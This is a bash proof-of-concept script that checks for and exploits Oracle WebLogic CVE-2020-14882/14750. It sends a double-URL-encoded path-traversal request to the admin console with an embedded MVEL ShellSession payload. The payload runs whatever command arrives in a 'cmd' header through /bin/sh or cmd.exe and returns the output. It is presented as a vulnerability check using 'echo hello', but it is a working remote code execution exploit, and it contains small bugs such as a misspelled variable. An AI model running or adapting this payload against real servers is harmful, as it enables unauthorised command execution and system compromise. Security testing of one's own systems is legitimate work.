#!/bin/bash

#######################################################################################################
# CVE-2020-14882                                                                                      #
# CVE-2020-14750                                                                                      #
# Author: Kizz MyAnthia                                                                                #
# twitter: @KizzMyAnthia                                                                              #
# PoC of Oracle Weblogic vulnerability with                                                           #
# the previously noted CVEs                                                                           #
# Original code of exploit reference:       https://github.com/jas502n/CVE-2020-14882                 #
#######################################################################################################

if [ "$1" == "-h" ] || [ -z "$1" ]; then
  echo "How to use: `basename $0` host:port remote command
Checks for vulnerabilities CVE-2020-14750 and CVE-2020-14882 on the specified host
NOTE: This check is unable to validate to 100% certainty of vulnerability, if the result is that it is NOT VULNERABLE please check from localhost, in a future version a FP validation check will be added."
  exit 0
fi


host=$1

result=$(curl -k -s  -X POST \
    -H "Host: $host" -H "cmd: echo hello" \
    --data-binary $'\x0d\x0a_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();\x0d\x0aweblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();\x0d\x0ajava.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");\x0d\x0afield.setAccessible(true);\x0d\x0aObject obj = field.get(adapter);\x0d\x0aweblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj);\x0d\x0aString cmd = req.getHeader(\"cmd\");\x0d\x0aString[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\x0d\x0aif (cmd != null) {\x0d\x0a    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\A\").next();\x0d\x0a    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);\x0d\x0a    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));\x0d\x0a    res.getServletOutputStream().flush();\x0d\x0a    res.getWriter().write(\"\");\x0d\x0a}executeThread.interrupt();\x0d\x0a\");' \
    "http://$host/console/css/%252e%252e%252fconsole.portal")

if [ "$result" == "hello" ]; then
	echo "Vulnerability exploited correctly. $host is VULNERABLE"
elif [[ "$resultado" =~ "The server encountered an unexpected condition which prevented it from fulfilling the request" ]]; then
	echo "The vulnerability has not been exploited, due to the type of response obtained from $ host it is possible that it is not vulnerable or that something has gone wrong"
else
	echo "The vulnerability could not be verified, check that $host is correct and that it is accessible"
fi
